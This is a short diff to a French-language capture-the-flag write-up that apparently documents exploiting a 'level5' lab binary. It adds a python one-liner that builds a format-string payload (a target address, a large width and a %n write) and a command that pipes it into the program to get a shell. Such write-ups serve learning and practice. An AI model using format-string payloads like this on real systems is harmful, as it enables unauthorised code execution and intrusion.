@@ -55,3 +55,7 @@ Et nous avons ainsi acces au shell:
 ![Capture d’écran 2020-08-10 à 14 02 56](https://user-images.githubusercontent.com/25014717/89780782-5e86ac80-db12-11ea-8f90-c98408973bc6.png)
 
 ![Capture d’écran 2020-08-10 à 14 03 54](https://user-images.githubusercontent.com/25014717/89780777-5dee1600-db12-11ea-8c8b-d6b99fd5af27.png)
+
+`$ python -c 'print "\x5c\xf4\xff\xbf" + "%134513824d" + "%4$n"' > /tmp/lvl5xpl`
+
+`$ cat /tmp/lvl5xpl - | ./level5`
